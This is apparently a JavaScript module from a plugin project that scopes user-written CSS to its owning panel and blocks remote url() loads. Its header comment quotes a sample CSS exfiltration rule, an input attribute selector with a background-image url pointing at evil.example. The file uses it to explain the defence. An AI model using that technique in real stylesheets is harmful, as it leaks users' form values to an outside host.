/**
 * CodeFig style scoper — the single implementation.
 *
 * Consumed by two callers, the same split as `import-resolver.js`:
 *   - the UI at run time (src/ui.html), where a script's `@STYLE_START` block is rewritten and
 *     injected as `<style data-style-owner="{id}">` when the script's panel opens;
 *   - the validator at build time (validate-scripts.js), which runs the same rewrite over a
 *     package's `package.css` and treats a failure as a build error rather than a warning.
 *
 * See `.plans/30-scoped-stylesheets.md`. Two things this exists to prevent, not just to namespace:
 *
 * **Containment.** A user-authored stylesheet runs in the same iframe as the rest of the plugin.
 * Prefixing every selector with `[data-style-owner="{id}"]` is what stops `.config-ui-field { … }`
 * in one script's styling from reaching every other panel's fields.
 *
 * **Egress.** `url()` is the actual attack surface, not `@import` — `@font-face { src: url(…) }`
 * loads a remote font without ever writing the word `@import`, and an attribute selector paired
 * with `background-image: url(…)` can exfiltrate a panel's field values one CSS rule per character,
 * with no JavaScript at all:
 *
 *   input[value^="x"] { background-image: url(https://evil.example/x) }
 *
 * So: `@import` (the at-rule, importing another stylesheet) is stripped silently — it is a
 * developer mistake, not an attack, since it does not carry a value to leak. Every *other* `url()`
 * whose scheme is not `data:` is a hard error, wherever it appears — not stripped, because a
 * silently-vanishing background is a bug report waiting to happen, and rejecting a whole
 * stylesheet is loud where a script author will actually see it.
 *
 * `position: fixed` is rejected outright rather than contained with `contain: layout paint` on the
 * panel root: simpler to reason about, and does not depend on how faithfully a browser applies
 * `contain` to a descendant that already computed its own stacking context.
 */
(function (root, factory) {
  var api = factory();
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else root.CodeFigStyleScoper = api;
})(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  var URL_RE = /url\(\s*(['"]?)([^'")]*)\1\s*\)/gi;
  var IMPORT_RE = /@import\b[^;]*;/gi;
  var FIXED_RE = /position\s*:\s*fixed\b/i;

  // Strips CSS block comments. A close-comment token cannot appear inside a real CSS comment, so
  // no nesting to track.
  function stripComments(css) {
    return css.replace(/\/\*[\s\S]*?\*\//g, '');
  }

  /** Every scheme but `data:` is rejected — see the module comment for why this is not a denylist. */
  function badUrls(css) {
    var bad = [];
    var m;
    URL_RE.lastIndex = 0;
    while ((m = URL_RE.exec(css))) {
      var value = (m[2] || '').trim();
      if (value && !/^data:/i.test(value)) bad.push(value);
    }
    return bad;
  }

  /**
   * Splits CSS text into top-level `{ prelude, body }` blocks, brace- and string-aware so a `{`
   * inside a quoted `content: "{"` cannot desynchronise the split. Returns `{ error }` on anything
   * that does not balance — an unparseable stylesheet is gate 1's build error, not a silent drop.
   */
  function splitBlocks(css) {
    var blocks = [];
    var i = 0, n = css.length;
    var buf = '';
    var inString = null;

    function skipString(text, from, quote) {
      var j = from;
      while (j < text.length) {
        if (text[j] === '\\') { j += 2; continue; }
        if (text[j] === quote) return j + 1;
        j++;
      }
      return text.length;
    }

    while (i < n) {
      var ch = css[i];
      if (ch === '"' || ch === "'") {
        var end = skipString(css, i + 1, ch);
        buf += css.slice(i, end);
        i = end;
        continue;
      }
      if (ch === '{') {
        var prelude = buf;
        buf = '';
        var depth = 1;
        var j = i + 1;
        while (j < n && depth > 0) {
          var c2 = css[j];
          if (c2 === '"' || c2 === "'") { j = skipString(css, j + 1, c2); continue; }
          if (c2 === '{') depth++;
          else if (c2 === '}') depth--;
          j++;
        }
        if (depth !== 0) return { error: 'unterminated block after "' + prelude.trim().slice(0, 60) + '"' };
        blocks.push({ prelude: prelude, body: css.slice(i + 1, j - 1) });
        i = j;
        continue;
      }
      if (ch === '}') {
        return { error: 'unexpected "}" near "' + buf.trim().slice(0, 60) + '"' };
      }
      buf += ch;
      i++;
    }
    if (buf.trim()) return { error: 'trailing content with no block: "' + buf.trim().slice(0, 60) + '"' };
    return { blocks: blocks };
  }

  /** Top-level commas only — `:not(a, b)` must not split into two selectors. */
  function splitSelectorList(text) {
    var parts = [];
    var depth = 0, start = 0;
    for (var i = 0; i < text.length; i++) {
      var ch = text[i];
      if (ch === '(') depth++;
      else if (ch === ')') depth--;
      else if (ch === ',' && depth === 0) {
        parts.push(text.slice(start, i));
        start = i + 1;
      }
    }
    parts.push(text.slice(start));
    return parts.map(function (s) { return s.trim(); }).filter(Boolean);
  }

  function prefixSelector(selector, ownerAttr) {
    // `:root` is the one bare selector rewritten to the prefix itself, not prepended to it — a
    // script must not reach global custom properties by writing to the real root.
    if (selector.trim() === ':root') return ownerAttr;
    return ownerAttr + ' ' + selector;
  }

  /**
   * Rewrites one level of blocks. `keyframeNames` is populated (top-level names -> renamed) as
   * `@keyframes` blocks are found, so a later `animation`/`animation-name` rewrite pass can use it.
   */
  function rewriteBlocks(blocks, ownerAttr, ownerId, keyframeNames, errors) {
    var out = [];
    blocks.forEach(function (block) {
      var prelude = block.prelude.trim();

      if (/^@media\b/i.test(prelude) || /^@supports\b/i.test(prelude)) {
        var inner = splitBlocks(block.body);
        if (inner.error) { errors.push(inner.error); return; }
        var rewritten = rewriteBlocks(inner.blocks, ownerAttr, ownerId, keyframeNames, errors);
        out.push(prelude + ' {\n' + rewritten + '\n}');
        return;
      }

      if (/^@keyframes\b/i.test(prelude)) {
        var nameMatch = /^@keyframes\s+([\w-]+)/i.exec(prelude);
        if (!nameMatch) { errors.push('unreadable @keyframes name: "' + prelude + '"'); return; }
        var renamed = nameMatch[1] + '--' + ownerId;
        keyframeNames[nameMatch[1]] = renamed;
        // The body is percentage/from/to selectors, not element selectors — left alone.
        out.push('@keyframes ' + renamed + ' {\n' + block.body + '\n}');
        return;
      }

      if (/^@font-face\b/i.test(prelude)) {
        // No selector to scope — a font applies by name, not by matching an element.
        out.push('@font-face {\n' + block.body + '\n}');
        return;
      }

      if (/^@/.test(prelude)) {
        errors.push('unsupported at-rule: "' + prelude.slice(0, 40) + '"');
        return;
      }

      if (FIXED_RE.test(block.body)) {
        errors.push('"position: fixed" is rejected — a correctly-scoped selector can still paint ' +
          'over the whole plugin UI once it escapes the normal box model. Selector: "' +
          prelude.trim().slice(0, 60) + '"');
        return;
      }

      var selectors = splitSelectorList(prelude);
      if (!selectors.length) { errors.push('empty selector before a rule body'); return; }
      var scoped = selectors.map(function (s) { return prefixSelector(s, ownerAttr); });
      out.push(scoped.join(',\n') + ' {\n' + block.body + '\n}');
    });
    return out.join('\n\n');
  }

  function rewriteAnimationReferences(css, keyframeNames) {
    var names = Object.keys(keyframeNames);
    if (!names.length) return css;
    return css.replace(/((?:^|[;{])\s*animation(?:-name)?\s*:\s*)([^;}]+)/gi, function (full, prop, value) {
      names.forEach(function (name) {
        var re = new RegExp('\\b' + name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g');
        value = value.replace(re, keyframeNames[name]);
      });
      return prop + value;
    });
  }

  /**
   * Scopes a script or package's CSS to one owner. `ownerId` is that script's or package's id —
   * whatever `data-style-owner` should read.
   *
   * Returns `{ ok: true, css }` on success, `{ ok: false, errors }` on anything that could not be
   * safely rewritten — never a partial or best-effort result, per the module comment on egress.
   */
  function scopeStylesheet(cssText, ownerId) {
    if (typeof ownerId !== 'string' || !ownerId) {
      return { ok: false, errors: ['scopeStylesheet requires a non-empty ownerId'] };
    }
    var errors = [];
    var stripped = stripComments(String(cssText || ''));
    stripped = stripped.replace(IMPORT_RE, '');

    var urlIssues = badUrls(stripped);
    if (urlIssues.length) {
      return {
        ok: false,
        errors: urlIssues.map(function (u) {
          return 'non-data: url() is not allowed in a script stylesheet: ' + u;
        })
      };
    }

    var split = splitBlocks(stripped);
    if (split.error) return { ok: false, errors: [split.error] };

    var ownerAttr = '[data-style-owner="' + ownerId + '"]';
    var keyframeNames = {};
    var body = rewriteBlocks(split.blocks, ownerAttr, ownerId, keyframeNames, errors);
    if (errors.length) return { ok: false, errors: errors };

    return { ok: true, css: rewriteAnimationReferences(body, keyframeNames) };
  }

  /**
   * The flat list of raw (unscoped) selectors a stylesheet declares, recursing into `@media`/
   * `@supports` and skipping `@keyframes`/`@font-face` (neither has an element selector). Used by
   * `validate-scripts.js`'s cross-package duplicate-selector gate — a package copying another
   * package's rule instead of promoting it to `ui.css` is exactly what that gate exists to catch,
   * and it needs the same parse this module already does rather than a second one.
   *
   * Comments-stripped input is assumed; callers that have not already validated the stylesheet
   * with `scopeStylesheet` should not treat a non-empty result as proof the sheet is well-formed.
   */
  function topLevelSelectors(cssText) {
    var stripped = stripComments(String(cssText || '')).replace(IMPORT_RE, '');
    var split = splitBlocks(stripped);
    if (split.error) return [];
    var selectors = [];
    (function walk(blocks) {
      blocks.forEach(function (block) {
        var prelude = block.prelude.trim();
        if (/^@media\b/i.test(prelude) || /^@supports\b/i.test(prelude)) {
          var inner = splitBlocks(block.body);
          if (!inner.error) walk(inner.blocks);
          return;
        }
        if (/^@/.test(prelude)) return;
        splitSelectorList(prelude).forEach(function (s) { selectors.push(s); });
      });
    })(split.blocks);
    return selectors;
  }

  return { scopeStylesheet: scopeStylesheet, topLevelSelectors: topLevelSelectors };
});
